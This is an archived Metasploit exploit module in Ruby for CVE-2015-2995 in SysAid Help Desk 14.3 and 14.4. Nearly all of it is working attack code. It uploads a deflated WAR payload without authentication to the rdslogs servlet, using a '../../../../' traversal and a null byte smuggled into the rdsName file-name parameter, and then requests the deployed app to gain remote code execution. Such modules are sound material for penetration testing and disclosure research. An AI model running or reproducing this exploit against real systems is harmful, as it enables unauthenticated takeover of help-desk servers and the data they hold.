##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# NOTE !!!
# This exploit is kept here for archiving purposes only.
# Please refer to and use the version that has been accepted into the Metasploit framework.

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'SysAid Help Desk rdslogs Arbitrary File Upload',
      'Description' => %q{
        This module exploits a file upload vulnerability in SysAid Help Desk v14.3 and v14.4.
        The vulnerability exists in the RdsLogsEntry servlet which accepts unauthenticated
        file uploads and handles zip file contents in a insecure way. Combining both weaknesses
        a remote attacker can accomplish remote code execution. Note that this will only work if the
        target is running Java 6 or 7 up to 7u25, as Java 7u40 and above introduce a protection
        against null byte injection in file names. This module has been tested successfully on version
        v14.3.12 b22 and v14.4.32 b25 in Linux. In theory this module also works on Windows, but SysAid
        seems to bundle Java 7u40 and above with the Windows package which prevents the vulnerability
        from being exploited.
      },
      'Author'       =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2015-2995' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/generic/sysaid-14.4-multiple-vulns.txt' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2015/Jun/8' ]
        ],
      'DefaultOptions' => { 'WfsDelay' => 30 },
      'Privileged'  => false,
      'Platform'    => 'java',
      'Arch'        => ARCH_JAVA,
      'Targets'     =>
        [
          [ 'SysAid Help Desk v14.3 - 14.4 / Java Universal', { } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jun 3 2015'))

    register_options(
      [
        Opt::RPORT(8080),
        OptInt.new('SLEEP',
          [true, 'Seconds to sleep while we wait for WAR deployment', 15]),
        OptString.new('TARGETURI',
          [true, 'Base path to the SysAid application', '/sysaid/'])
      ], self.class)
  end


  def check
    servlet_path = 'rdslogs'
    bogus_file = rand_text_alphanumeric(4 + rand(32 - 4))
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], servlet_path),
      'method' => 'POST',
      'vars_get' => {
        'rdsName' => bogus_file
      }
    })
    if res and res.code == 200
      return Exploit::CheckCode::Detected
    end
  end


  def exploit
    app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    tomcat_path = '../../../../'
    servlet_path = 'rdslogs'

    # We need to create the upload directories before our first attempt to upload the WAR.
    print_status("#{peer} - Creating upload directory")
    bogus_file = rand_text_alphanumeric(4 + rand(32 - 4))
    send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], servlet_path),
      'method' => 'POST',
      'data' => Zlib::Deflate.deflate(rand_text_alphanumeric(4 + rand(32 - 4))),
      'ctype' => 'application/xml',
      'vars_get' => {
        'rdsName' => bogus_file
      }
    })

    war_payload = payload.encoded_war({ :app_name => app_base }).to_s

    # We have to use the Zlib deflate routine as the Metasploit Zip API seems to fail
    print_status("#{peer} - Uploading WAR file...")
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], servlet_path),
      'method' => 'POST',
      'data' => Zlib::Deflate.deflate(war_payload),
      'ctype' => 'application/octet-stream',
      'vars_get' => {
        'rdsName' => tomcat_path + app_base + ".war" + "\x00"
      }
    })

    # The server either returns a 200 OK when the upload is successful.
    if res and (res.code == 200)
      print_status("#{peer} - Upload appears to have been successful, waiting " + datastore['SLEEP'].to_s +
      " seconds for deployment")
      register_files_for_cleanup("webapps/" + app_base + ".war")
      sleep(datastore['SLEEP'])
    else
      fail_with(Exploit::Failure::Unknown, "#{peer} - WAR upload failed")
    end

    print_status("#{peer} - Executing payload, wait for session...")
    send_request_cgi({
      'uri'    => normalize_uri(app_base, Rex::Text.rand_text_alpha(rand(8)+8)),
      'method' => 'GET'
    })
  end
end
